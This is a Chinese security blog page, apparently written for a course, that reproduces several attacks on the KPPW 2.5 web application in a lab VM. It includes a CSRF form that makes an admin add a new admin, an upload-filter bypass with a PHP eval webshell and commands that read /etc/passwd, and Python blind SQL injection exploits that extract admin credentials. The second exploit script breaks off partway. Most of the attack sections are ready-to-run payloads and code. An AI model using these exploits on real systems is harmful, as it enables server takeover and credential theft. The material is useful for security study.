</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/61IildflAL.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/0l5K9ahhlI.PNG" alt="mark"><br><strong><code>http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid=</code>这个url是后台管理员添加用户的url，我们构造表单，action的值设为这个url，写几个隐藏表单诱使管理员去点击提交，就会以管理员的身份去添加一个新的管理员，当然这不是网站管理员的意愿，而是我们的</strong></p>
<p><strong>提交完成后退出当前网站用户，模拟管理员登陆查看私信，可以看到一个按钮，单单一个按钮，看到的人总会想着去点一下，当然这个按钮可以构造的更具有吸引力</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/76hH05ID8e.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/b3m8d2K1fC.PNG" alt="mark"><br><strong>当点击按钮过后，管理员就会在不知情的情况下发起添加用户的http请求去添加一个用户名为qianlan密码为newadmin的用户，当然这是我们构造的，看用户列表可以看到多了一个名为qianlan的用户，我们登陆一下可以成功进入后台，进行下一步的渗透</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/1gdjJ8kgAd.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/K4e1kIgCJc.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/cKa291JeeF.PNG" alt="mark"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/11/KPPW25fileupload/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/11/KPPW25fileupload/" itemprop="url">KPPW2.5文件上传导致远程代码执行</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-11T23:01:49+08:00">
                2018-01-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="KPPW2-7文件上传导致远程代码执行漏洞复现"><a href="#KPPW2-7文件上传导致远程代码执行漏洞复现" class="headerlink" title="KPPW2.7文件上传导致远程代码执行漏洞复现"></a>KPPW2.7文件上传导致远程代码执行漏洞复现</h1><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>和上一节的一样，同样是kpww2.5版本，此版本存在文件上传漏洞，攻击者可以上传php一句话木马拿下webshell</strong></p>
<p>###上传点###<br><strong>漏洞分析</strong></p>
<p><strong>在control/ajax/upload.php中：</strong></p>
<pre><code>$pathDir = setUploadPath($fileType, $objType);
$upload = new keke_upload_class(S_ROOT.$pathDir ,$fileFormat,$maxSize);
$savename = $upload-&gt;run( $filename , 1);
</code></pre><p><strong>再来看run方法：</strong></p>
<pre><code>function run($fileInput, $randName = 1) {
        if (isset ( $_FILES [$fileInput] )) {
            $fileArr = $_FILES [$fileInput];
            if (is_array ( $fileArr [&apos;name&apos;] )) { 
                ....
            }
            else { 
                $this-&gt;getExt ( $fileArr [&apos;name&apos;] ); 
                $this-&gt;setSavename (); 
                if ($this-&gt;copyfile ( $fileArr, $randName )) { 
                    $this-&gt;returnArray [] = $this-&gt;returninfo;
                } else {
                    $this-&gt;returninfo [&apos;error&apos;] = $this-&gt;errmsg ();
                    $this-&gt;returnArray [] = $this-&gt;returninfo;
                }
                return $this-&gt;errno ? $this-&gt;errmsg () : $this-&gt;returnArray;
            }
            return false;
        }
</code></pre><p><strong>在这段方法中，先是获取了$this-&gt;getExt ( $fileArr [‘name’] ); 文件后缀，这里没有什么问题，然后再生成上传后的随机名+后缀. 最后执行上传操作copyfile</strong></p>
<pre><code>function copyfile($fileArray, $randName) {
        $this-&gt;returninfo = array ();
        $this-&gt;returninfo [&apos;name&apos;] = $fileArray [&apos;name&apos;];
        if ($randName) {
            $this-&gt;returninfo [&apos;saveName&apos;] = $this-&gt;saveName;
        } else {
            $this-&gt;saveName = $this-&gt;returninfo [&apos;saveName&apos;] = $fileArray [&apos;name&apos;];
        }
        $this-&gt;returninfo [&apos;size&apos;] = $fileArray [&apos;size&apos;]; 
        $this-&gt;returninfo [&apos;type&apos;] = $fileArray [&apos;type&apos;];
        if (! $this-&gt;validateFormat ()) {
            $this-&gt;errno = 11;
            return false;
        }
        if(!$this-&gt;fileFilter($fileArray [&quot;tmp_name&quot;],$this-&gt;ext)){
            $this-&gt;errno = 21;
            return false;
        }
        if ($this-&gt;savePathFunc) {
            $savePathFunc = $this-&gt;savePathFunc;
            $this-&gt;savePath = $savePathFunc ( $this-&gt;saveName );
            $this-&gt;returninfo [&apos;path&apos;] = $this-&gt;savePath;
        }
        $this-&gt;makeDirectory ( $this-&gt;savePath );
        if (! @is_writable ( $this-&gt;savePath )) {
            @mkdir ( $this-&gt;savePath, 0777, true );
        }
        if ($this-&gt;overwrite == 0 &amp;&amp; @file_exists ( $this-&gt;savePath . $this-&gt;saveName )) {
            $this-&gt;errno = 13;
            return false;
        }
        if ($this-&gt;maxSize != 0) {
            if ($fileArray [&quot;size&quot;] &gt; $this-&gt;maxSize) {
                $this-&gt;errno = 14;
                return false;
            }
        }
        if (! @copy ( $fileArray [&quot;tmp_name&quot;], $this-&gt;savePath . $this-&gt;saveName )) {
            $this-&gt;errno = $fileArray [&quot;error&quot;];
            return false;
        }
    }
</code></pre><p><strong>这里先做了$this-&gt;validateFormat (),根据文件名来获取后缀，再判断后缀是否合法：</strong></p>
<pre><code>function validateFormat() {
        if (! is_array ( $this-&gt;fileFormat ) || in_array ( strtolower ( $this-&gt;ext ), $this-&gt;fileFormat ) || in_array ( strtolower ( $this-&gt;returninfo [&apos;type&apos;] ), $this-&gt;fileFormat ))
            return true;
        else
            return false;
    }
</code></pre><p><strong>关键看这个条件：<code>in_array ( strtolower ( $this-&gt;returninfo [&#39;type&#39;] ), $this-&gt;fileFormat )</code>,这里判断type是否合法而且用了或操作，等于这边为true了，整个if条件就为true了， 而这个type我们可以改动的，只要抓包把<code>Content-Disposition: form-data; name=&quot;name&quot;; filename=&quot;1.php&quot;Content-Type:</code> 中的Content-Type设置成我们想要的值就可以绕过了。绕过了这个地方以为后面就一帆风顺了，但是还是上传不上去，继续看下面的一个操作$this-&gt;fileFilter($fileArray [“tmp_name”],$this-&gt;ext）这个操作实际上是根据文件头来确定文件的后缀，再检测后缀与之前的文件名获取的后缀是否一致。 这本来是一个很好的过滤方法，但开发人员又写错了：</strong></p>
<pre><code>function fileFilter($path,$ext){
        if(keke_file_class::get_file_type($path,$this-&gt;ext)==$ext){
            return true;
        }else{
            return false;
        }
    }
static function get_file_type($file_path, $ext = &apos;&apos;) {
        $fp = fopen ( $file_path, &apos;r&apos; );
        $bin = fread ( $fp, 2 );
        fclose ( $fp );
        $strInfo = @unpack ( &quot;C2chars&quot;, $bin );
        $typeCode = intval ( $strInfo [&apos;chars1&apos;] . $strInfo [&apos;chars2&apos;] );
        $fileType = &apos;unknown&apos;;
        $typeCode == &apos;3780&apos; &amp;&amp; $fileType = &quot;pdf&quot;;
        $typeCode == &apos;6787&apos; &amp;&amp; $fileType = &quot;swf&quot;;
        $typeCode == &apos;7784&apos; &amp;&amp; $fileType = &quot;midi&quot;;
        $typeCode == &apos;7790&apos; &amp;&amp; $fileType = &quot;exe&quot;;
        $ext == &apos;txt&apos; &amp;&amp; $fileType = &quot;txt&quot;;
        in_array ( $typeCode, array (&apos;8297&apos;, &apos;8075&apos; ) ) &amp;&amp; $fileType = $ext; 
        if (in_array ( $typeCode, array (&apos;255216&apos;, &apos;7173&apos;, &apos;6677&apos;, &apos;13780&apos; ) )) { 
            in_array ( $ext, array (&apos;jpg&apos;, &apos;gif&apos;, &apos;bmp&apos;, &apos;png&apos;, &apos;jpeg&apos; ) ) and $fileType = $ext or $fileType = &apos;jpg&apos;;
        }
        if ($typeCode == &apos;208207&apos;) { 
            in_array ( $ext, array (&apos;wps&apos;, &apos;ppt&apos;, &apos;dot&apos;, &apos;xls&apos;, &apos;doc&apos;, &apos;docx&apos; ) ) and $fileType = $ext or $fileType = &apos;doc&apos;;
        }
        return $fileType;
    }
</code></pre><p><strong>关键看这个操作：in_array ( $typeCode, array (‘8297’, ‘8075’ ) ) &amp;&amp; $fileType = $ext; 如果typecode 等于8297或者8075的时候，就会将filetype赋值为$ext,这样不就是饶过了之前的那个if判断。POC: 只需要将content-type 设置成jpg 再在上传的文件开头写上Ra 就可以成功绕过上传过滤。 （Ra 获取以后的code值就是8297）</strong><br><strong>漏洞利用，构造上传页面</strong></p>
<pre><code>&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://192.168.50.157/kppw25/index.php?do=ajax&amp;view=upload&amp;file_type=big&amp;filename=filename&quot;&gt;
请选择文件： &lt;br&gt;
&lt;input name=&quot;filename&quot; type=&quot;file&quot;&gt;&lt;br&gt;
&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt;
&lt;/form&gt;
</code></pre><p><strong>攻击者可在本地上传php一句话木马</strong></p>
<pre><code>Ra&lt;?php @eval($_POST[&apos;lawliet&apos;]);?&gt;
</code></pre><p><strong>点击上传文件后相当于向192.168.50.157发送了一次上传文件的http请求，用burp抓包，将content-type改为jpg即可上传成功并返回webshell地址</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/Amai76dbB6.PNG" alt="mark"><br><strong>访问webshell地址即可远程执行命令，比如<code>ifconfig</code>查看ip，<code>cat /etc/passwd</code>查看敏感文件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/LEeEDH92h9.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/8Je556HiH8.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/bKCH5mBI8b.PNG" alt="mark"><br><strong>由于之前在安装的时候将kppw25目录下的文件降成了apache权限，所以导致有些root命令不能执行，比如<code>cat /etc/shadow</code>，所以就算攻击者真的拿下webshell也只是apache的权限，没有系统权限,除非利用系统漏洞提权为root</strong></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/11/KPPW25sqli/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Lawliet">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/LuFei.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Lawliet Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/11/KPPW25sqli/" itemprop="url">KPPW2.5几处sql注入漏洞利用与exp编写</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-11T14:10:02+08:00">
                2018-01-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="KPPW2-5版本几处sql注入漏洞利用以及exp编写"><a href="#KPPW2-5版本几处sql注入漏洞利用以及exp编写" class="headerlink" title="KPPW2.5版本几处sql注入漏洞利用以及exp编写"></a>KPPW2.5版本几处sql注入漏洞利用以及exp编写</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>老师布置的web安全课程设计，要求自己搭建环境利用漏洞渗透服务器，看到题目中有一个是KPPW，感觉这一个题目更具有实际性，于是自己选择了KPPW这个漏洞百出的开源web应用作为题目，这篇文章不再使用集成环境去搭建环境，而是在最小化安装的centos上一步步搭建渗透环境去测试，这篇文章先来研究KPPW2.5版本，其它的版本会写在另外的文章中</strong></p>
<h3 id="lamp环境搭建"><a href="#lamp环境搭建" class="headerlink" title="lamp环境搭建"></a>lamp环境搭建</h3><p><strong>下载centos6.4镜像，在虚拟机里最小化安装centos，安装服务器版</strong></p>
<p><strong>为了下载更方便，使用国内163镜像的源，更新源</strong></p>
<pre><code>yum -y install wget
mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.help/CentOS6-Base-163.repo
</code></pre><p><strong>安装apache服务</strong></p>
<pre><code>yum -y install httpd
service httpd start
service iptables stop
</code></pre><p><strong>在浏览器输入虚拟机ip测试是否安装成功，安装成功会显示apache的界面，注意这里要关闭iptables，不然会被防火墙禁止访问80端口</strong></p>
<p><strong>安装mysql服务</strong></p>
<pre><code>yum -y install mysql mysql-server mysql-devel
service mysqld start
</code></pre><p><strong>安装后进入mysql终端，默认密码为空，给mysql设置密码</strong></p>
<pre><code>mysql -u root -p
use mysql;
update user set Password=PASSWORD(&quot;root&quot;) where USER=&apos;root&apos;
service mysqld restart
</code></pre><p><strong>安装php和一些常用的php扩展，kppw的安装要求php-gd库的扩展，否则不能安装</strong></p>
<pre><code>yum -y install php php-mysql
yum search php
yum -y install gd php-gd gd-devel php-xml php-common php-mbstring php-ldap php-pear php-xmlrpc php-imap php-mysqli
service httpd restart
</code></pre><h3 id="安装KPPW2-5"><a href="#安装KPPW2-5" class="headerlink" title="安装KPPW2.5"></a>安装KPPW2.5</h3><p><strong>用winSCP将kppw2.5的压缩包上传至centos并解压</strong></p>
<pre><code>cd /var/www/html
mkdir kppw25
yum -y install unzip
cd kppw25
unzip KPPW_GBK.zip
</code></pre><p><strong>将kppw25以及其目录下的文件的用户及用户组改为apache，否则安装时会显示目录不可写</strong></p>
<pre><code>chown -R apache kppw25
chgrp -R apache kppw25
</code></pre><p><strong>在浏览器地址栏输入</strong></p>
<pre><code>http://192.168.50.157/kppw25/install
</code></pre><p><strong>进行安装</strong></p>
<p><strong>如果到安装第二步一直进入不了第三步，再安装一下gd库扩展，重启一下服务即可</strong></p>
<pre><code>yum -y install php-gd
service httpd restart
</code></pre><p><strong>如果不出意外的话会出现这个界面，安装的第三步</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/29C4afBc1E.PNG" alt="mark"><br><strong>我们输入mysql数据库的密码并且设置后台登陆密码点击提交，安装成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/di2fadg729.PNG" alt="mark"></p>
<h3 id="对漏洞分析利用并编写exp"><a href="#对漏洞分析利用并编写exp" class="headerlink" title="对漏洞分析利用并编写exp"></a>对漏洞分析利用并编写exp</h3><p><strong>KPPW2.5版本曾爆出了特别多的sql注入漏洞，在这里选择几个注入漏洞来研究学习一下</strong></p>
<p><strong>注入点1</strong></p>
<p><strong>1.漏洞分析</strong></p>
<p><strong>文件/control/user/account_auth.php</strong></p>
<pre><code>$arrAllowAuth = array(&apos;realname&apos;,&apos;enterprise&apos;,&apos;bank&apos;,&apos;mobile&apos;,&apos;email&apos;);
if ($code&amp;&amp;in_array($code,$arrAllowAuth)) {
    $code or $code = $keys [&apos;0&apos;]; 
    $code or kekezu::show_msg ( $_lang [&apos;param_error&apos;], &quot;index.php?do=auth&quot;, 3, &apos;&apos;, &apos;warning&apos; );
    $auth_class = &quot;keke_auth_&quot; . $code . &quot;_class&quot;;
    $objAuth = new $auth_class ( $code ); 
    $auth_item = $arrAllAuthItems [$code]; 
    $auth_dir = $auth_item [&apos;auth_dir&apos;]; 
    $arrAuthInfo = $objAuth-&gt;get_user_auth_info ( $gUid, 0, $intBankAid ); 
    require S_ROOT . &quot;/auth/$code/control/index.php&quot;;
    require keke_tpl_class::template ( &apos;auth/&apos; . $code . &apos;/tpl/&apos; . $_K [&apos;template&apos;] . &apos;/&apos;.$step );
    die;
} else {
    $real_pass = keke_auth_fac_class::auth_check ( &apos;enterprise&apos;, $gUid ) or $real_pass = keke_auth_fac_class::auth_check ( &quot;realname&quot;, $gUid );
    $arrHasAuthItem = keke_auth_fac_class::get_auth ( $gUserInfo );
    $arrUserAuthInfo = $arrHasAuthItem [&apos;info&apos;];
}
</code></pre><p><strong>仔细看看这里的：</strong></p>
<pre><code>$arrAuthInfo = $objAuth-&gt;get_user_auth_info ( $gUid, 0, $intBankAid );
</code></pre><p><strong>这里的变量$intBankAid进入了函数<code>get_user_auth_info</code>函数 跟进函数<code>get_user_auth_info</code> 文件<code>/lib/sys/keke_auth_base_class.php</code>：</strong></p>
<pre><code>public function get_user_auth_info($uid,$is_username=0,$show_id=&apos;&apos;){
        $sql=&quot;select * from &quot;.TABLEPRE.$this-&gt;_auth_table_name;
        if($uid){
            $is_username==&apos;0&apos; and $sql.=&quot; where uid = &apos;$uid&apos; &quot; or $sql.=&quot; where username = &apos;$uid&apos; &quot;;
            $show_id and $sql.=&quot; and &quot;.$this-&gt;_primary_key.&quot;=&quot;.$show_id;
            $sql .=&quot; order by $this-&gt;_primary_key desc&quot;;
            $data = db_factory::query($sql);
            if(sizeof($data)==1){
                return $data[0];
            }else{
                return $data;
            }
        }else{
            return array();
        }
    }
</code></pre><p><strong>接收到的变量$intBankAid——$show_id，然后$show_id进入$sql 整个过程中变量$intBankAid未过滤，最后进入$sql进入数据库，导致sql注入漏洞</strong></p>
<p><strong>2.漏洞证明</strong><br><strong>首先注册一个账号，然后访问</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/bAiFL66i3m.PNG" alt="mark"><br><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147</code><br><strong>接下来要在银行认证中添加一个新账户，信息随便填，在这里是测试不需要真实信息，但是信息格式一定要正确</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/3glfhjHF30.PNG" alt="mark"><br><strong>添加完账户后在银行认证中点击立即认证</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/hI72b1L1ke.PNG" alt="mark"><br><strong>认证完成后回到<code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/bcLgl5B7bc.PNG" alt="mark"><br><strong>intBankAid存在盲注，盲注类型为基于bool的盲注，<code>and 1=1</code>与<code>and 1=2</code>返回的页面结果不一样，证明存在盲注</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/ALb2d2G1k0.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/kd4Cc9gjhF.PNG" alt="mark"><br><strong>用burp的comparer模块对返回结果做对比</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/26h9A6lj2E.PNG" alt="mark"><br><strong>3.漏洞利用与exp编写</strong><br><strong>证明了存在基于bool的逻辑判断盲注，我们可以在intBankAid参数后构造逻辑判断，根据页面的差别来判断数据库中的数据</strong></p>
<p><strong>mid函数为mysql的字符串截取函数，截取<code>select+concat(username,password)+from+keke_witkey_member+limit+0,1</code>的第一个字符，与CHAR(97)，也就是a字符进行比较，如果相等说明and后的逻辑为真返回正常页面，可以看出数据库查询结果的第一个字符为’a’</strong></p>
<pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147 and mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=CHAR(97)
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/DAjiD497K2.PNG" alt="mark"><br><strong>如果and后的逻辑判断为假，将返回不同的页面</strong></p>
<pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147 and mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=CHAR(98)
</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/8EBD1CDhjh.PNG" alt="mark"><br><strong>由此可用python编写exp读取admin的用户名和密码，代码如下</strong></p>
<pre><code>#encoding:utf-8
#kppw2.5 base bool blind sqli
import requests
headers={
    &apos;Cookie&apos;:&apos;PHPSESSID=8p38igtr7fvvvi25d28rrql740&apos;
}#获取用户身份
payload=&quot;http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147&quot;
rtrue=requests.get(payload,headers=headers).content#向正确页面发起一次请求获取返回结果,相当于bool判断为真的返回页面
data=&quot;&quot;
for i in range(1,38):#admin用户名和密码一共长为37
    for j in range(33,128):#循环可显示字符的ascii码值
        payload=&quot;http://192.168.50.157/kppw25/index.php?do=user&amp;view=account&amp;op=auth&amp;code=bank&amp;step=step2&amp;intBankAid=147 and mid((select concat(username,password) from keke_witkey_member limit 0,1),%d,1)=CHAR(%d)&quot;%(i,j)
        r=requests.get(payload,headers=headers).content
        if r==rtrue:
            data=data+chr(j)
            print data
            break
</code></pre><p><strong>脚本跑出admin的用户名和密码，可以在解密网站解密</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/GB3j6HcK50.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/j6f27Db7FB.PNG" alt="mark"><br><strong>注入点2</strong><br><strong>1.漏洞分析</strong><br><strong>文件/control/pubgoods.php</strong></p>
<pre><code>&lt;?php
kekezu::check_login();
$strPageTitle = &apos;发布商品-&apos;.$_K [&apos;html_title&apos;];
$strPageKeyword = &apos;发布商品,&apos;.$_K [&apos;html_title&apos;];
$strPageDescription = $kekezu-&gt;_sys_config[&apos;index_seo_desc&apos;];
$id = intval($id);
$step = strval(trim($step));
......
$strUrl = &quot;index.php?do=pubgoods&amp;id=&quot;.$id;
$_SESSION[&apos;spread&apos;] = &apos;index.php?do=pubgoods&apos;;
require S_ROOT . &quot;/shop/&quot; . $arrModelInfo[&apos;model_dir&apos;] . &quot;/control/pub.php&quot;;
</code></pre><p><strong>看最后两行，这里的<code>$arrModelInfo[&#39;model_dir&#39;]</code>可以为goods或者service 当<code>$arrModelInfo[&#39;model_dir&#39;]</code>为goods时，我们跟进文件： <code>/shop/goods/control/pub.php</code></strong></p>
<pre><code>&lt;?php defined ( &apos;IN_KEKE&apos; ) or exit ( &apos;Access Denied&apos; );
$stdCacheName = &apos;service_cache_&apos;.$id.&apos;_&apos; . substr ( md5 ( $gUid ), 0, 6 );
$objRelease = goods_release_class::get_instance ($id);
$objRelease-&gt;get_service_obj ( $stdCacheName ); 
$arrPubInfo = $objRelease-&gt;_std_obj-&gt;_release_info; 
$arrConfig = $objRelease-&gt;_service_config; 
$arrPubInfo[&apos;indus_pid&apos;] and $arrAllIndustrys = CommonClass::getIndustryByPid($arrPubInfo[&apos;indus_pid&apos;],&apos;indus_id,indus_pid,indus_name&apos;);
switch ($step) {
    case &apos;step1&apos;:
......
if($action == &apos;delete_image&apos;){
            $strSql = sprintf(&quot;select file_id,file_name,save_name from %switkey_file where file_id in(%s)&quot;,TABLEPRE,$fileid);
            $arrFileInfo = db_factory::get_one($strSql);
            $resText = CommonClass::delFileByFileId($fileid);
            if($resText){
                $array = explode(&apos;,&apos;, $arrPubInfo[&apos;file_ids&apos;]);
                $newArr = CommonClass::returnNewArr($arrFileInfo[&apos;save_name&apos;], $array);
                $_POST[&apos;file_ids&apos;] = implode(&quot;,&quot;, $newArr);
                $arrPubInfo and $_POST = array_merge ( $arrPubInfo, $_POST);
                $objRelease-&gt;save_service_obj ($_POST, $stdCacheName ); 
                kekezu::echojson(&apos;删除成功&apos;,1,array(&apos;fileid&apos;=&gt;$fileid,&apos;save_name&apos;=&gt;$arrFileInfo[&apos;save_name&apos;]));die;
            }
        }
        if($action == &apos;delete_goodsfile&apos;){
            $strSql = sprintf(&quot;select file_id,file_name,save_name from %switkey_file where file_id in(%s)&quot;,TABLEPRE,$fileid);
            $arrFileInfo = db_factory::get_one($strSql);
            $resText = CommonClass::delFileByFileId($fileid);
</code></pre><p><strong>当action=delete_image，或者action=delete_goodsfile时，参数fileid都会进入sql语句，而且没有过滤，没有引号保护，最后导致sql注入 继续往下，参数fileid还进入了函数delFileByFileId，继续跟踪： 文件/lib/inc/CommonClass.php：</strong></p>
<pre><code>public static function delFileByFileId($fileId){
        $strSql = sprintf(&quot;select file_id,file_name,save_name from %switkey_file where file_id in(%s)&quot;,TABLEPRE,$fileId);
        $arrFileInfo = db_factory::get_one($strSql);
        $filename = S_ROOT.$arrFileInfo[&apos;save_name&apos;];
        if(file_exists($filename)){
            unlink($filename);
        }
        return db_factory::execute(&quot;delete from &quot;.TABLEPRE.&quot;witkey_file where file_id = &quot;.$fileId);
    }
</code></pre><p><strong>这里的fileid同样进入了select和delete语句，都没有过滤处理和保护，导致两处注入 这里在delete时，可以删除用户发布的商品或者任务的图片已经文件，而且这里最后删除时只根据fileid删除，没有判断删除对象的用户属性，导致可以任意删除任意用户发布的文件，导致越权操作。 下面来看看文件/lib/inc/CommonClass.php，这是一个全局调用的函数 来看看有多少文件使用了/lib/inc/CommonClass.php中的这个delFileByFileId函数</strong></p>
<p><strong>可以看到这里一个有12个文件使用了这个delFileByFileId函数，我们再来找两个其他文件，看看是不是也没有处理传入delFileByFileId函数的fileid参数 第一个文件/control/taskhandle.php：</strong></p>
<pre><code>case &apos;workover&apos;:
        if (isset($formhash)&amp;&amp;kekezu::submitcheck($formhash)){
            $resText = $objTask-&gt;work_over($tarContent, $file_id,intval($modify));
            if($resText === true){
                kekezu::show_msg ( &apos;操作成功&apos;, &apos;index.php?do=task&amp;id=&apos;.$taskId, 3, NULL, &apos;ok&apos; );
            }else{
                kekezu::show_msg ( $resText, &apos;index.php?do=task&amp;id=&apos;.$taskId, 3, NULL, &apos;fail&apos; );
            }
        }
        if($action == &apos;deleteFile&apos;){
            $resText = CommonClass::delFileByFileId($fileid);
            if($resText){
                kekezu::echojson(&apos;删除成功&apos;,1,array(&apos;fileid&apos;=&gt;$fileid));die;
            }
        }
</code></pre><p><strong>fileid在全文上下没有处理，这里进入函数delFileByFileId后，也会导致注入 其他的就不一一列出来了，都存在同样的问题 fileid没有处理，直接进入函数delFileByFileId，然后fileid进入select和delete语句，导致sql注入，并且存在越权删除任意用户文件的漏洞 </strong><br><strong>2.漏洞证明</strong></p>
<pre><code>http://192.168.50.157/kppw25/index.php?do=pubgoods&amp;step=step1&amp;action=delete_image&amp;fileid=5566)+and+1=if(mid((select+concat(username,password)+from+keke_witkey_member+limit+0,1),1,1)=char(97),sleep(5),0)%23
</code></pre><p><strong>来解释一下上面的payload，mid为mysql的字符串截取函数，截取<code>select+concat(username,password)+from+keke_witkey_member+limit+0,1</code>的第一个字符，与CHAR(97)，也就是a字符进行比较，如果相等就延时5s再响应页面，否则就立即响应页面，因为查询有延时可以判断数据库查询结果的第一个字符为’a’（admin）,所以请求会有10s的延时，这里会延迟10秒返回 因为这里的存在两处select，所以sleep(5)了两次</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180111/hdmf1Dchcb.PNG" alt="mark"><br><strong>根据延时注入用python编写exp可以将admin的用户名和密码注入出来，代码如下</strong></p>
<pre><code>#encoding:utf-8
#kppw2.5 base time blind sqli
import requests
import time
headers={
    &apos;Cookie&apos;:&apos;PHPSESSID=8p38igtr7fvvvi25d28rrql740&apos;
}#获取用户身份
data=&quot;&quot;
for i in range(1,38):#admin用户名和密码一共长为37
    for j in range(33,128):#循环可显示字符的ascii码值
        payload=&quot;http://192.168.50.157/kppw25/index.php?do=pubgoods&amp;step=step1&amp;action=delete_image&amp;fileid=5566) and 1=if(mid((select concat(username,password) from keke_witkey_member limit 0,1),%d,1)=CHAR(%d),sleep(5),0)&quot;%(i,j)
        payload=payload+&quot;%23&quot;
        starttime=time.time()#获取发起请求的时间
        r=requests.get(payload,headers=headers)
